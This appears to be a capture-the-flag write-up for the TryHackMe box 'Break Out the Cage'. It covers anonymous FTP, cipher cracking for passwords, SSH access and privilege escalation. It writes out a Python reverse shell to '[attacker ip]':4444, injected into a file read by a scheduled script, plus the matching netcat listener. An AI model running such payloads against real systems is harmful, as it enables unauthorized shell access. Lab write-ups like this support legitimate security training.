---
title: "Break Out the Cage"
date: 2020-07-11
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Break Out the Cage"
os: "Linux"
platform: "TryHackMe"
tags: [Break Out The Cage, TryHackMe, encryption, email]
comments: false
---

Break Out the Cage is another recently released easy box on [TryHackme](https://www.tryhackme.com). Let's start off with a port scan with `nmap -p- -T4 [machine ip]`. This will return 3 open ports: ftp, ssh, and http. 

![Break Out The Cage nmap1](/images/BreakOutTheCage1.png)

Let's enumerate these 3 ports with `nmap -sC -sV -O -p 21,22,80 [machine ip]`.

![Break Out The Cage nmap2](/images/BreakOutTheCage2.png)

It appears that there is anonymous FTP access open, let's login as anonymous with `ftp [machine ip]` and enter **anonymous** for the username and password. We are able to successfully connect. I tried to list the directory and received an error so I change the mode to passive with **passive** and I was able to run `ls`. There was a file named **dad_tasks**, that I saved locally to my machine with `get dad_tasks`. I then exited the FTP site with `bye`.

![Break Out The Cage ftp dad_tasks](/images/BreakOutTheCage3.png)

Running `cat dad_tasks from my local machine gives me results that are encoded, most likely in base 64.

![Break Out The Cage cat dad_tasks](/images/BreakOutTheCage4.png)

Let's run `cat dad_tasks | base64 -d` to decode it from base64. This gives us a different type of encoding.

![Break Out The Cage base64 decode](/images/BreakOutTheCage5.png)

This appears to be some sort of cipher. I tried several, and ended up finding out it is a Vigenere cipher. Since I didn't have the key, I used a [Vigenere solver](https://www.guballa.de/vigenere-solver) to assist with cracking this, which results in the following.

![Break Out The Cage Vigenere Cipher](/images/BreakOutTheCage6.png)

The last line contains what appears to be Weston's password, which is the answer to question one.

Now that we have a password, let's try to ssh in as weston with `ssh weston@[machine ip]`. Enter the password that was recovered above. Success, now we are logged in as weston.

![Break Out The Cage ssh user access](/images/BreakOutTheCage7.png)

Let's see what weston can run as root with `sudo -l`. We are given the following results:

![Break Out The Cage sudo -l](/images/BreakOutTheCage8.png)

Let's run that file and see what happens. It prints some text. Running `cat /usr/bin/bees` shows you that this is a bash script.

![Break Out The Cage bees](/images/BreakOutTheCage25.png)

Unfortunately, we are not able to edit this file. However, every few minutes a broadcast message from cage comes up.

![Break Out The Cage broadcast](/images/BreakOutTheCage9.png)

We are not able to access cage's home directory as weston. However, if we run `id`, we can see that weston is part of both the weston and cage groups

![Break Out The Cage id](/images/BreakOutTheCage10.png)

Let's use `find / -group "cage" -print 2>/dev/null` to find all files with the group owner of cage.

![Break Out The Cage find](/images/BreakOutTheCage12.png)

We already know we don't have access to /home/cage, but let's try to navigate to /opt/.dads_scripts/ with `cd /opt/.dads_scripts` and view directory contents and permissions with `ls -al`.

![Break Out The Cage dads_scripts](/images/BreakOutTheCage13.png)

It appears we only have read to the python script, so we can't modify it directly. Let's view the contents of the script to see what it does with `cat spread_the_quotes.py`.

![Break Out The Cage spread_the_quotes.py](/images/BreakOutTheCage14.png)

It looks like it is opening a file in /opt/.dads_scripts/.files/.quotes and reading a random line and then echoing it. Let's navigate to that directory with `cd /opt/.dads_scripts/.files/`. Next let's run `ls -al`. It appears we have access to write to the **.quotes** file as the cage group has write permissions to it.

![Break Out The Cage .files](/images/BreakOutTheCage15.png)

Let's run `vi .quotes` to open up the contents for editing and delete everything out of the file. This can be done by pressing `dd` over and over until all the lines are deleted. Next, press Insert and  **-- INSERT --** should show up at the bottom of the screen. This allows you to enter in new information. Let's enter the following: `"test" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[attacker ip]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`. This will end the wall command's input which will send out test as a broadcast, and then && will run the command after, which is a way to create a reverse shell with python. We know this shell will work due to the fact that python scripts are running on this machine already. Next, press escape followed by `:wq!` to write and quit vim. 

![Break Out The Cage .quotes](/images/BreakOutTheCage16.png)

In another terminal window, run `nc -nvlp 4444` and wait a few minutes for the script to run. You should receive a reverse shell connection as cage. Running `whoami` confirms this and running `ls -al` shows an **email_backup** directory and a file called **Super_Duper_Checklist**. Let's view the contents of the Checklist first with `cat Super_Duper_Checklist`.

![Break Out the Cage cat Super_Duper_Checklist](/images/BreakOutTheCage18.png)

This is the user flag for this box. Let's now see if cage has any sudo level permissions. Let's run `sudo -l`. Unfortunately, it asks for cage's password which we do not have. Let's go review the email_backup folder by typing in `cd email_backup`. Running `ls -al` shows 3 files here. Using `cat em*` will type the contents of all 3 emails.

![Break Out The Cage email_backup](/images/BreakOutTheCage19.png)

The emails mention a Face Off sequel and have several references to the word face in them. The last email has something interesting in it based on a weird note from the agent.

![Break Out The Cage email_3](/images/BreakOutTheCage20.png)

This appears to be another encrypted message. Let's see if this is also a Vigenere cipher. The word face is mentioned over and over and over in these emails, so let's see if that's the key to the cipher. Since we are assuming this is the correct key, let's use this [Vigenere Cipher Decoder](https://www.boxentriq.com/code-breaking/vigenere-cipher) to decode the cipher.

![Break Out The Cage Vignere Cipher Decoder](/images/BreakOutTheCage21.png)

In the 3rd email, it states that it likely has something to do with his account on this server. Since there are no other users, it's safe to assume that this could potentially be the password for root. Let's run `su root` and enter the password we obtained above.

![Break Out The Cage su root](/images/BreakOutTheCage22.png)

Success! We now have root access. Let's see if we can find the root flag now. Let's navigate to root's home folder with `cd /root` and run `ls -al`. We will see an email_backup folder. Let's navigate to it with `cd email_backup` and run `ls`, we see two emails in this folder.

![Break Out The Cage finding root flag](/images/BreakOutTheCage23.png)

Let's run `cat em*` to view their contents. In the bottom of the second email is the root flag.

![Break Out The Cage Root Flag](/images/BreakOutTheCage24.png)

This is the root flag for this challenge!
